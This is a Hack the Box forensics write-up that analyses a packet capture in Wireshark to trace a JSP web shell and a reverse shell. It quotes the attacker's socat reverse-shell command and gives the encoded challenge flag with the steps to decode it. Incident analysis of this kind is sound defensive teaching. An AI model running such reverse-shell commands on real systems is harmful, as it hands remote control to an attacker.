---
title: "HTB • Wrong Spooky Season"
tags:
  - "Forensics"
  - "Very Easy Difficulty"
  - "Blue Team"
  - "Packet Capture"
  - "Beginner"
excerpt: "Wrong Spooky Season is a forensics challenge released on Hack the Box that is marked as very easy and involves blue team operations and analyzing a packet capture to pinpoint malicious traffic"
categories:
  - "Writeups"
  - "Hack the Box Challenges"
---

Wrong Spooky Season is a forensics challenge released by [**c4n0pus**](https://app.hackthebox.com/users/527470) on [**Hack the Box**](https://app.hackthebox.com/challenges/wrong-spooky-season) that is marked as very easy and involves analyzing a packet capture to pinpoint malicious traffic.

> "I told them it was too soon and in the wrong season to deploy such a website, but they assured me that theming it properly would be enough to stop the ghosts from haunting us. I was wrong." Now there is an internal breach in the \`Spooky Network\` and you need to find out what happened. Analyze the the network traffic and find how the scary ghosts got in and what they did.

## Packet Capture Analysis

We'll be using [Wireshark](https://www.wireshark.org/) to analyze the packets in the packet capture file.

### HTTP Traffic

The first thing we notice when opening the capture is that there is some plaintext HTTP traffic. 

![Traffic overview](/assets/img/post/htb-challenges-wrong-spooky-season/wireshark.png)
_The first impression of the captured traffic_

We'll use the filter `http` to display only HTTP packets. Looking at the HTTP traffic, it seems that client **192.168.1.180** has uploaded a JSP web shell, and is running commands through GET requests.

![HTTP traffic](/assets/img/post/htb-challenges-wrong-spooky-season/wireshark-2.png)
_Malicious HTTP Command & Control_

The attacker can be seen installing the `socat` utility, then running it like so:

>
```bash
socat TCP:192.168.1.180:1337 EXEC:bash
```
{:.nolineno}

This command is meant to establish a TCP reverse shell on port **1337**.

### Reverse Shell

We'll use the filter `tcp.port==1337` then follow the TCP stream of the packets to view the reverse shell session.

![TCP stream](/assets/img/post/htb-challenges-wrong-spooky-season/tcp-stream.png)

The last command sent by the attacker contains a statement that does pretty much nothing.

>
```bash
echo "==gC9FSI5tGMwA3cfRjd0o2Xz0GNjNjYfR3c1p2Xn5WMyBXNfRjd0o2eCRFS" | rev > /dev/null
```
{:.nolineno}

The suspicious string can be reversed and base64-decoded to get the flag.

```bash
echo "==gC9FSI5tGMwA3cfRjd0o2Xz0GNjNjYfR3c1p2Xn5WMyBXNfRjd0o2eCRFS" | rev | base64 -d
```
{:.nolineno}
